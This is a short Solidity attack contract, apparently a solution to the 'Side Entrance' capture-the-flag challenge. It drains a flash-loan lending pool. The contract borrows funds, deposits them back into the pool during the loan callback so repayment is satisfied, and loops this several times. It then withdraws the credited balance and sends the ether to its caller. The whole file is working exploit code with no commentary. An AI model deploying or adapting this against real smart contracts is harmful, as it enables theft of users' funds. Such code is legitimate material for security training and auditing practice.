// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
contract SideAttacker {
    SideEntranceLenderPool public pool;
    uint entrances;

    constructor(SideEntranceLenderPool _poolAddress) {
        pool = _poolAddress;
    }

    function callFlashLoan(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function execute() external payable {
        pool.deposit{value:msg.value}();
        if(entrances < 9){
         entrances++;
         pool.flashLoan(100 ether);
        }
    }

    function callWithdraw() external {
        pool.withdraw();

        msg.sender.call{value:address(this).balance}("");
    }

    receive() external payable{}
}
 